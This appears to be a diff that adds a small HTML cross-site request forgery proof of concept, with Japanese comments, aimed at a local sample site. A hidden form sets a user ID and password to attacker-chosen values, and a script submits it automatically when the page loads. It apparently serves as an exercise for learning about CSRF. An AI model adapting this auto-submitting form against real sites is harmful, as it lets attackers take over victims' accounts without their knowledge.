@@ -1,0 +1,13 @@
+<!-- ユーザー情報変更ページへPOST送信するForm -->
+<form action="http://localhost:8888/api/users/" method="POST">
+  <!-- サンプルサイトのhtmlソースを見ながらIDとパスワードのパラメータ名（name）を合わせ、
+    変更させたい適当な値をvalueに設定する -->
+  <input name="userId" value="hogehogehacker" />
+  <input name="password" value="hogehogehacker" />
+</form>
+<script>
+  // 自動でpost送信させるコード
+  var form = document.querySelector("form");
+  form.submit()
+  console.log('そうしん')
+</script>
